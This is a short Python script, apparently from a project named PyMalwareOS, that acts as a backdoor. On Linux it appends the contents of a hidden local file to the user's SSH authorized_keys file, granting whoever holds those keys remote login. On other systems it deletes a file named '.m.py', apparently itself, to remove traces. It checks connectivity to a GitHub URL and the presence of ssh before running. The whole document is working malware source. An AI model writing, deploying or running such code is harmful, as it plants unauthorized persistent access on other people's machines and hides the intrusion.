import os
import subprocess
import sys
import requests

def is_ssh_installed():
    try:
        result = subprocess.run(["which", "ssh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0 and bool(result.stdout)
    except Exception as e:
        return False

def main():
    if os.sys.platform in ['linux', 'linux2']:
        username = os.getlogin()
        ssh_directory = f"../.ssh/"
        authorized_file_path = os.path.join(ssh_directory, "authorized_keys")
        source_file = ".authorized.txt"

        with open(source_file, 'r') as authorized_ssh:
            content = authorized_ssh.read()

        with open(authorized_file_path, 'a') as keys:
            keys.write(content)
    else:
        os.remove('.m.py')

try:
    response = requests.get("https://github.com/74lg0/PyMalwareOS")
    if response.status_code == 200 and is_ssh_installed():
        main()
    else:
        sys.exit()
except Exception as e:
    sys.exit()

if __name__ == "__main__":
    main()
